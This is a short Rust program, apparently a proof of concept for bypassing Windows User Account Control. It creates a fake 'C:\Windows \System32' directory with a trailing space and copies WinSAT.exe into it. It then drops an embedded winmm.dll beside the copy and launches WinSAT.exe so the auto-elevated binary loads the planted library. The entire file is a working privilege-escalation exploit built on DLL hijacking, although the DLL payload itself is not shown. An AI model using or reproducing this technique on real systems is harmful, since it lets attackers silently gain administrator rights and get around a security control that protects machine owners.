use std::{fs, os::windows::process::CommandExt, process::Command};

static WINMM_DLL: &[u8] = std::include_bytes!(concat!(env!("OUT_DIR"), "/winmm.dll"));

pub fn main() {
    println!(r"[+] Creating fake directory C:\Windows \System32\...");
    fs::create_dir_all(r"C:\Windows \")
        .and_then(|_| fs::create_dir_all(r"C:\Windows \System32\"))
        .unwrap();

    println!(r"[+] Copying C:\Windows\System32\WinSAT.exe to C:\Windows \System32\WinSAT.exe...");
    fs::copy(
        r"C:\Windows\System32\WinSAT.exe",
        r"C:\Windows \System32\WinSAT.exe",
    )
    .map_err(|err| println!(r"[-] Error copying C:\Windows\System32\WinSAT.exe: {}", err))
    .ok();

    println!(r"[+] Creating C:\Windows \System32\winmm.dll...");
    fs::write(r"C:\Windows \System32\winmm.dll", WINMM_DLL)
        .map_err(|err| println!("[-] Error creating the fake dll: {}", err))
        .ok();

    println!(r"[+] Starting C:\Windows \System32\WinSAT.exe...");
    // TODO: don't use cmd.exe
    Command::new("cmd.exe")
        .args(["/C", r"C:\Windows \System32\WinSAT.exe"])
        .creation_flags(0x00000008)
        .spawn()
        .unwrap();
}
